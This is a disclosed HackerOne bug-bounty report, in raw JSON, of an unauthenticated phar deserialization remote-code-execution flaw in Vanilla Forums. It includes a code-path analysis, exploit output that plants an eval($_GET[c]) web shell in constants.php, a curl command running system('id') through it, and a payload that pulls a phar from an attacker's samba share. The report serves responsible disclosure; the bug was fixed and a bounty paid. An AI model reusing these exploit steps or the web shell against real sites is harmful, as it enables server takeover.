{"id":410882,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTA4ODI=","url":"https://hackerone.com/reports/410882","title":"Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical)","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-09-17T23:05:19.946Z","submitted_at":"2018-09-17T23:05:19.946Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mr_me","url":"/mr_me","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17443,"url":"https://hackerone.com/vanilla","handle":"vanilla","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Vanilla","twitter_handle":"vanilla","website":"http://vanillaforums.com","about":"Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-11-23T15:46:58.101Z","bug_reporter_agreed_on_going_public_at":"2018-10-24T15:46:51.607Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n\nAn **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.\n\n## Notes:\n\n- **THIS BUG IS UNAUTHENTICATED**, however you need to have an admin account to run this poc because we leverage the file upload to get our phar file on the target.\n- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\n- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\n- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Windows, you could use a samba share. I have tested this and its proved to be working 100%.\n  The payload would look like phar:////attacker-share/share/poc.jpg and can be reached unauthenticated.\n- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\n\n## Analysis:\n\nInside of the library/core/functions.general.php file we can see the following code:\n\n```\nclass ImportController extends DashboardController {\n\n    ...\n\n    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {\n        $pageInfo = [\n            'Url' =\u003e $url,\n            'Title' =\u003e '',\n            'Description' =\u003e '',\n            'Images' =\u003e [],\n            'Exception' =\u003e false\n        ];\n\n        try {\n            // Make sure the URL is valid.\n            $urlParts = parse_url($url);\n            if ($urlParts === false || !in_array(val('scheme', $urlParts), ['http', 'https'])) {\n                throw new Exception('Invalid URL.', 400);\n            }\n\n            $request = new ProxyRequest();\n            $pageHtml = $request-\u003erequest([\n                'URL' =\u003e $url,\n                'Timeout' =\u003e $timeout,\n                'Cookies' =\u003e $sendCookies,\n                'Redirects' =\u003e true,\n            ]);                                                                         // 1\n\n            if (!$request-\u003estatus()) {\n                throw new Exception('Couldn\\'t connect to host.', 400);\n            }\n\n\n            ...\n\n            // Page Images\n            if (count($pageInfo['Images']) == 0) {\n                $images = domGetImages($dom, $url);                                     // 2\n                $pageInfo['Images'] = array_values($images);\n            }\n```\n\nAt [1] we can reach a HTTP SSRF with an attacker controlled `$url`. Note also that there is no authentication here. Then at [2] we can reach the `domGetImages()` function with our `$url` and `$dom` which is the response from the attackers web server.\n\nContinuing inside of the library/core/functions.general.php file we can see the following code:\n\n```\n    function domGetImages($dom, $url, $maxImages = 4) {\n        $images = [];\n        foreach ($dom-\u003equery('img') as $element) {                                      // 3\n            $images[] = [\n                'Src' =\u003e absoluteSource($element-\u003eattr('src'), $url),                   // 4\n                'Width' =\u003e $element-\u003eattr('width'),\n                'Height' =\u003e $element-\u003eattr('height'),\n            ];\n        }\n\n        // Sort by size, biggest one first\n        $imageSort = [];\n        // Only look at first 4 images (speed!)\n        $i = 0;\n        foreach ($images as $imageInfo) {\n            $image = $imageInfo['Src'];                                                 // 5\n\n            if (strpos($image, 'doubleclick.') != false) {\n                continue;\n            }\n\n            try {\n                if ($imageInfo['Height'] \u0026\u0026 $imageInfo['Width']) {\n                    $height = $imageInfo['Height'];\n                    $width = $imageInfo['Width'];\n                } else {\n                    list($width, $height) = getimagesize($image);                       // 6\n                }\n```\n\nAt [3] the code looks for a img tag and at [4] it will set the `$images` array with the attackers controlled src attribute. Then at [5] the code sets the `$image` variable with the attackers controlled src. Finally at [6] we can reach the `getimagesize()` with an arbitrary string. \n\n## Exploitation:\n\nIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums. \nThe payload would look like phar:////attacker-share/share/poc.phar/.jpg and could be reached unauthenticated.\n\n## Example:\n\nThe following steps are used to re-create the vulnerability:\n\n1. We create our phar file:\n\n`saturn:~ mr_me$ php poc-stage-1.php`\n\n2. We run the poc-stage-2.py which will trigger the bug\n\n```\nsaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123 172.16.175.1\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name 6O51ZT69P0S4.jpg!\n(+) starting http server...\n(!) triggered callback for phar!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the victim box:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n\u003c?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n```\n\n## References:\n\n- https://rdot.org/forum/showthread.php?t=4379\n\n## Impact\n\nAn unauthenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eAn \u003cstrong\u003eunauthenticated\u003c/strong\u003e attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.\u003c/p\u003e\n\n\u003ch2 id=\"notes\"\u003eNotes:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cstrong\u003eTHIS BUG IS UNAUTHENTICATED\u003c/strong\u003e, however you need to have an admin account to run this poc because we leverage the file upload to get our phar file on the target.\u003c/li\u003e\n\u003cli\u003eThe default path to the constants.php file is \u0026#39;/var/www/html/conf/constants.php\u0026#39;, please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\u003c/li\u003e\n\u003cli\u003eBEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\u003c/li\u003e\n\u003cli\u003eIn my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Windows, you could use a samba share. I have tested this and its proved to be working 100%.\nThe payload would look like phar:////attacker-share/share/poc.jpg and can be reached unauthenticated.\u003c/li\u003e\n\u003cli\u003eAlso note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"analysis\"\u003eAnalysis:\u003c/h2\u003e\n\n\u003cp\u003eInside of the library/core/functions.general.php file we can see the following code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass ImportController extends DashboardController {\n\n    ...\n\n    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {\n        $pageInfo = [\n            \u0026#39;Url\u0026#39; =\u0026gt; $url,\n            \u0026#39;Title\u0026#39; =\u0026gt; \u0026#39;\u0026#39;,\n            \u0026#39;Description\u0026#39; =\u0026gt; \u0026#39;\u0026#39;,\n            \u0026#39;Images\u0026#39; =\u0026gt; [],\n            \u0026#39;Exception\u0026#39; =\u0026gt; false\n        ];\n\n        try {\n            // Make sure the URL is valid.\n            $urlParts = parse_url($url);\n            if ($urlParts === false || !in_array(val(\u0026#39;scheme\u0026#39;, $urlParts), [\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;])) {\n                throw new Exception(\u0026#39;Invalid URL.\u0026#39;, 400);\n            }\n\n            $request = new ProxyRequest();\n            $pageHtml = $request-\u0026gt;request([\n                \u0026#39;URL\u0026#39; =\u0026gt; $url,\n                \u0026#39;Timeout\u0026#39; =\u0026gt; $timeout,\n                \u0026#39;Cookies\u0026#39; =\u0026gt; $sendCookies,\n                \u0026#39;Redirects\u0026#39; =\u0026gt; true,\n            ]);                                                                         // 1\n\n            if (!$request-\u0026gt;status()) {\n                throw new Exception(\u0026#39;Couldn\\\u0026#39;t connect to host.\u0026#39;, 400);\n            }\n\n\n            ...\n\n            // Page Images\n            if (count($pageInfo[\u0026#39;Images\u0026#39;]) == 0) {\n                $images = domGetImages($dom, $url);                                     // 2\n                $pageInfo[\u0026#39;Images\u0026#39;] = array_values($images);\n            }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [1] we can reach a HTTP SSRF with an attacker controlled \u003ccode\u003e$url\u003c/code\u003e. Note also that there is no authentication here. Then at [2] we can reach the \u003ccode\u003edomGetImages()\u003c/code\u003e function with our \u003ccode\u003e$url\u003c/code\u003e and \u003ccode\u003e$dom\u003c/code\u003e which is the response from the attackers web server.\u003c/p\u003e\n\n\u003cp\u003eContinuing inside of the library/core/functions.general.php file we can see the following code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    function domGetImages($dom, $url, $maxImages = 4) {\n        $images = [];\n        foreach ($dom-\u0026gt;query(\u0026#39;img\u0026#39;) as $element) {                                      // 3\n            $images[] = [\n                \u0026#39;Src\u0026#39; =\u0026gt; absoluteSource($element-\u0026gt;attr(\u0026#39;src\u0026#39;), $url),                   // 4\n                \u0026#39;Width\u0026#39; =\u0026gt; $element-\u0026gt;attr(\u0026#39;width\u0026#39;),\n                \u0026#39;Height\u0026#39; =\u0026gt; $element-\u0026gt;attr(\u0026#39;height\u0026#39;),\n            ];\n        }\n\n        // Sort by size, biggest one first\n        $imageSort = [];\n        // Only look at first 4 images (speed!)\n        $i = 0;\n        foreach ($images as $imageInfo) {\n            $image = $imageInfo[\u0026#39;Src\u0026#39;];                                                 // 5\n\n            if (strpos($image, \u0026#39;doubleclick.\u0026#39;) != false) {\n                continue;\n            }\n\n            try {\n                if ($imageInfo[\u0026#39;Height\u0026#39;] \u0026amp;\u0026amp; $imageInfo[\u0026#39;Width\u0026#39;]) {\n                    $height = $imageInfo[\u0026#39;Height\u0026#39;];\n                    $width = $imageInfo[\u0026#39;Width\u0026#39;];\n                } else {\n                    list($width, $height) = getimagesize($image);                       // 6\n                }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [3] the code looks for a img tag and at [4] it will set the \u003ccode\u003e$images\u003c/code\u003e array with the attackers controlled src attribute. Then at [5] the code sets the \u003ccode\u003e$image\u003c/code\u003e variable with the attackers controlled src. Finally at [6] we can reach the \u003ccode\u003egetimagesize()\u003c/code\u003e with an arbitrary string. \u003c/p\u003e\n\n\u003ch2 id=\"exploitation\"\u003eExploitation:\u003c/h2\u003e\n\n\u003cp\u003eIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums. \u003cbr\u003e\nThe payload would look like phar:////attacker-share/share/poc.phar/.jpg and could be reached unauthenticated.\u003c/p\u003e\n\n\u003ch2 id=\"example\"\u003eExample:\u003c/h2\u003e\n\n\u003cp\u003eThe following steps are used to re-create the vulnerability:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWe create our phar file:\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003ccode\u003esaturn:~ mr_me$ php poc-stage-1.php\u003c/code\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWe run the poc-stage-2.py which will trigger the bug\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123 172.16.175.1\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name 6O51ZT69P0S4.jpg!\n(+) starting http server...\n(!) triggered callback for phar!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \u0026quot;http://172.16.175.143/?c=system(\u0026#39;id\u0026#39;);\u0026quot;\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow, on the victim box:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003esteven\u003c/span\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"nx\"\u003epluto\u003c/span\u003e\u003cspan class=\"o\"\u003e:/\u003c/span\u003e\u003cspan class=\"k\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ewww\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003econf\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"nx\"\u003ecat\u003c/span\u003e \u003cspan class=\"nx\"\u003econstants\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \n\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nb\"\u003edefined\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;APPLICATION\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\u003cspan class=\"c1\"\u003e//[\u0026#39;\u0026#39;] = \u0026#39;\u0026#39;;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"references\"\u003eReferences:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://rdot.org/forum/showthread.php?t=4379\" href=\"/redirect?url=https%3A%2F%2Frdot.org%2Fforum%2Fshowthread.php%3Ft%3D4379\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://rdot.org/forum/showthread.php?t=4379\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn unauthenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.\u003c/p\u003e\n","bounty_amount":"600.0","formatted_bounty":"$600","weakness":{"id":52,"name":"Deserialization of Untrusted Data"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":347520,"file_name":"vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/347/520/89a8e73e0a1e58ae204f98e45793f15f28cfbd7b/vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip?response-content-disposition=attachment%3B%20filename%3D%22vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip%22%3B%20filename%2A%3DUTF-8%27%27vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055314Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=bb4097a531085b505bd4b6d5921648f7cb3aebb209daaf55bb7b3c46099a7748","file_size":150759,"type":"application/zip"}],"allow_singular_disclosure_at":"2018-11-23T15:46:51.645Z","allow_singular_disclosure_after":-66233182.94068498,"singular_disclosure_allowed":true,"vote_count":31,"voters":["irek","inhibitor181","spam404","sameerphad72","ahiezer","theappsec","mygf","eveeez","harry_mg","pandaonair","and 21 more..."],"severity":{"rating":"critical","score":9.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2101,"asset_type":"URL","asset_identifier":"*.vanillaforums.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3351373,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, please note that the poc-stage-2.py will need to listen on port 9090 and the `victim` Vanilla Forums target will need to be allowed to make an out bound connection to your attacker's machine.","markdown_message":"\u003cp\u003eAlso, please note that the poc-stage-2.py will need to listen on port 9090 and the \u003ccode\u003evictim\u003c/code\u003e Vanilla Forums target will need to be allowed to make an out bound connection to your attacker\u0026#39;s machine.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-17T23:17:10.849Z","updated_at":"2018-09-17T23:17:10.849Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3351648,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I forgot to mention, that the entry into the controller is in applications/dashboard/controllers/class.utilitycontroller.php:\n\n```\nclass UtilityController extends DashboardController {\n\n    ...\n\n    public function fetchPageInfo($url = '') {\n        $pageInfo = fetchPageInfo($url);                                     // 0\n\n        if (!empty($pageInfo['Exception'])) {\n            throw new Gdn_UserException($pageInfo['Exception'], 400);\n        }\n```\n\nAt [0] we call fetchPageInfo in library/core/functions.general.php.","markdown_message":"\u003cp\u003eI forgot to mention, that the entry into the controller is in applications/dashboard/controllers/class.utilitycontroller.php:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass UtilityController extends DashboardController {\n\n    ...\n\n    public function fetchPageInfo($url = \u0026#39;\u0026#39;) {\n        $pageInfo = fetchPageInfo($url);                                     // 0\n\n        if (!empty($pageInfo[\u0026#39;Exception\u0026#39;])) {\n            throw new Gdn_UserException($pageInfo[\u0026#39;Exception\u0026#39;], 400);\n        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [0] we call fetchPageInfo in library/core/functions.general.php.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-18T02:09:21.215Z","updated_at":"2018-09-18T02:09:21.215Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3353405,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there. We have received your report, a feedback will be posted shortly.\nThank you.","markdown_message":"\u003cp\u003eHi there. We have received your report, a feedback will be posted shortly.\u003cbr\u003e\nThank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-18T13:04:15.499Z","updated_at":"2018-09-18T13:04:15.499Z","actor":{"username":"dexterr","cleared":false,"url":"/dexterr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3362751,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-20T13:41:50.480Z","updated_at":"2018-09-20T13:41:50.480Z","actor":{"username":"manwithnoname","cleared":false,"url":"/manwithnoname","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3376858,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.","markdown_message":"\u003cp\u003eShipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-23T23:39:18.905Z","updated_at":"2018-09-23T23:39:18.905Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mr_me","url":"/mr_me"},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3376867,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nice @linc, can I please grab a bounty for this one?","markdown_message":"\u003cp\u003eNice \u003ca href=\"/linc\"\u003e@linc\u003c/a\u003e, can I please grab a bounty for this one?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-23T23:44:45.017Z","updated_at":"2018-09-23T23:44:45.017Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3377181,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yup, expect it by end of Tuesday at the latest. I need to wait til the accountant is in the office. :o)","markdown_message":"\u003cp\u003eYup, expect it by end of Tuesday at the latest. I need to wait til the accountant is in the office. :o)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-24T03:53:53.023Z","updated_at":"2018-09-24T03:53:53.023Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3379299,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-24T12:45:32.904Z","updated_at":"2018-09-24T12:45:32.904Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"bounty_amount":"600.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"vanilla","collaborator":{"username":"mr_me","url":"/mr_me"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3379415,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @linc !","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/linc\"\u003e@linc\u003c/a\u003e !\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-24T13:11:02.951Z","updated_at":"2018-09-24T13:11:02.951Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3527257,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-24T15:46:51.629Z","updated_at":"2018-10-24T15:46:51.629Z","first_to_agree":true,"actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4